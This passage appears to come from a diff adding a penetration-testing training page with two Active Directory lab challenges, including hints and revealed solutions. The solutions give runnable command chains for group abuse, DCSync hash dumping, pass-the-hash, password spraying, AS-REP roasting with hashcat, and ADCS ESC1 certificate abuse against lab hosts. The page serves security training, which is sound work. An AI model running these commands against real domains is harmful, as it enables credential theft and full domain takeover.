+        You have compromised <code>it_support / Support123!</code> on TARGET.LOCAL. BloodHound shows a complex ACL chain: it_support → GenericWrite on "IT_MANAGERS" group → IT_MANAGERS has WriteDACL on Domain. No direct Kerberoastable accounts visible. Navigate the chain.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Add yourself (it_support) to the IT_MANAGERS group</li>
+          <li>Use WriteDACL on Domain to grant DCSync rights</li>
+          <li>Perform DCSync and dump all hashes</li>
+          <li>Pass-the-Hash as Domain Admin</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c9-h1')">Hint 1: Group Add</button>
+        <button class="hint-btn" onclick="showHint(this, 'c9-h2')">Hint 2: WriteDACL Abuse</button>
+        <button class="hint-btn" onclick="showHint(this, 'c9-h3')">Hint 3: DCSync</button>
+        <div class="hint-content" id="c9-h1">PowerView: <code>Add-DomainGroupMember -Identity 'IT_MANAGERS' -Members 'it_support' -Credential $cred</code>. Or via net rpc: <code>net rpc group addmem "IT_MANAGERS" "it_support" -U target.local/it_support%Support123! -S DC_IP</code></div>
+        <div class="hint-content" id="c9-h2">Now IT_MANAGERS member: use WriteDACL to grant DCSync. <code>impacket-dacledit target.local/it_support:'Support123!' -action write -rights DCSync -principal it_support -target-dn "DC=target,DC=local" -dc-ip DC_IP</code></div>
+        <div class="hint-content" id="c9-h3"><code>impacket-secretsdump target.local/it_support:'Support123!'@DC_IP -just-dc-ntlm</code> → get DA hash → PTH.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c9-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c9-sol">
+          <h4>Step 1: Add to IT_MANAGERS via GenericWrite</h4>
+          <pre>net rpc group addmem "IT_MANAGERS" "it_support" \
+  -U target.local/it_support%'Support123!' -S 10.10.10.5
+# Verify:
+net rpc group members "IT_MANAGERS" -U target.local/it_support%'Support123!' -S 10.10.10.5</pre>
+          <h4>Step 2: Grant DCSync via WriteDACL</h4>
+          <pre>impacket-dacledit target.local/it_support:'Support123!' \
+  -dc-ip 10.10.10.5 -action write -rights DCSync \
+  -principal it_support -target-dn "DC=target,DC=local"</pre>
+          <h4>Step 3: DCSync + PTH</h4>
+          <pre>impacket-secretsdump target.local/it_support:'Support123!'@10.10.10.5 -just-dc-ntlm
+# Administrator:500:...:c1c1c1c1...:::
+nxc smb 10.10.10.5 -u Administrator -H c1c1c1c1... --shares
+impacket-psexec target.local/Administrator@10.10.10.5 -hashes :c1c1c1c1...</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 10 -->
+  <div class="challenge-card" id="c10">
+    <div class="challenge-header" onclick="toggleChallenge('c10')">
+      <span class="challenge-num">BOSS-10</span>
+      <span class="challenge-title">The Full Chain: External to DA</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff expert">Expert</span>
+        <span class="badge badge-cat">Full Chain · All Skills</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        External pentest. Scope: <code>megacorp.com</code>. No credentials. You have: the domain name, a VPN into the corporate network segment. Your target: Domain Admin on MEGACORP.LOCAL. This is the capstone challenge — no guided path, find your own way.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>External reconnaissance (subdomain enum, OSINT, web fingerprinting)</li>
+          <li>Identify and exploit a web vulnerability for initial foothold</li>
+          <li>Pivot from DMZ to internal domain</li>
+          <li>Enumerate AD and find a path to DA</li>
+          <li>Achieve Domain Admin and document full attack chain</li>
+          <li>Write a professional executive summary (3-5 sentences)</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c10-h1')">Hint 1: Recon</button>
+        <button class="hint-btn" onclick="showHint(this, 'c10-h2')">Hint 2: Foothold</button>
+        <button class="hint-btn" onclick="showHint(this, 'c10-h3')">Hint 3: AD Path</button>
+        <div class="hint-content" id="c10-h1">Sublist3r or subfinder for subdomain enum. Shodan for exposed services. theHarvester for email/employee names. Check LinkedIn for IT staff → potential usernames for spray.</div>
+        <div class="hint-content" id="c10-h2">If you find a login portal: spray discovered usernames with common passwords (Company2024!, Season+Year). If web app: test for SQLi, LFI, upload vulnerabilities.</div>
+        <div class="hint-content" id="c10-h3">Once on internal network with domain creds: BloodHound collection → find AS-REP Roastable accounts or Kerberoastable SPNs → crack → find ACL path or check ADCS.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c10-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c10-sol">
+          <h4>Step 1: External Recon</h4>
+          <pre>subfinder -d megacorp.com -o subs.txt
+httpx -l subs.txt -status-code -title
+# Found: vpn.megacorp.com, mail.megacorp.com, dev.megacorp.com
+
+theHarvester -d megacorp.com -b google,linkedin -l 200
+# Employees: john.smith, sarah.jones, mike.admin</pre>
+          <h4>Step 2: Password Spray on Mail Portal</h4>
+          <pre>kerbrute userenum --dc 10.10.10.5 -d megacorp.local usernames.txt
+# Valid: jsmith, sjones, madmin
+nxc smb 10.10.10.5 -u users.txt -p 'Megacorp2024!' --continue-on-success
+# jsmith:Megacorp2024! ← valid!</pre>
+          <h4>Step 3: AD Enumeration + AS-REP Roast</h4>
+          <pre>bloodhound-python -u jsmith -p 'Megacorp2024!' -d megacorp.local -dc-ip 10.10.10.5 -c All --zip
+impacket-GetNPUsers megacorp.local/ -usersfile users.txt -request -dc-ip 10.10.10.5
+# Got AS-REP hash for svc_backup
+hashcat -m 18200 asrep.txt rockyou.txt → Backup@2024</pre>
+          <h4>Step 4: ADCS ESC1 → DA</h4>
+          <pre>certipy find -u svc_backup@megacorp.local -p 'Backup@2024' -dc-ip 10.10.10.5 -vulnerable -stdout
+# ESC1: Template "EmployeeCert"
+certipy req -u svc_backup@megacorp.local -p 'Backup@2024' \
+  -ca MEGACORP-CA -template EmployeeCert \
+  -upn administrator@megacorp.local -dc-ip 10.10.10.5
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
+impacket-secretsdump megacorp.local/administrator@10.10.10.5 -hashes :&lt;hash&gt; -just-dc-ntlm</pre>
+          <h4>Executive Summary (Example)</h4>
+          <pre>During the assessment of MEGACORP.LOCAL, critical vulnerabilities were identified that
+allowed an unauthenticated external attacker to achieve full Domain Admin compromise.
+The attack chain began with OSINT-derived employee usernames, proceeded through a
+successful password spray attack, and culminated in exploitation of a misconfigured
+Active Directory Certificate Services template (ESC1) that allowed privilege escalation
+to Domain Administrator without requiring any existing privileged access.
+Immediate remediation of the ADCS template misconfiguration and enforcement of
+multi-factor authentication on all external-facing portals is strongly recommended.</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+function toggleChallenge(id) {
+  const card = document.getElementById(id);
+  card.classList.toggle('open');
+}
+function showHint(btn, id) {
+  const hint = document.getElementById(id);
+  hint.classList.toggle('visible');
+  btn.style.borderColor = hint.classList.contains('visible') ? '#fb923c' : '';
+  btn.style.color = hint.classList.contains('visible') ? '#fb923c' : '';
+}
+function toggleSolution(id) {
+  const sol = document.getElementById(id);
+  sol.classList.toggle('visible');
+}
+</script>
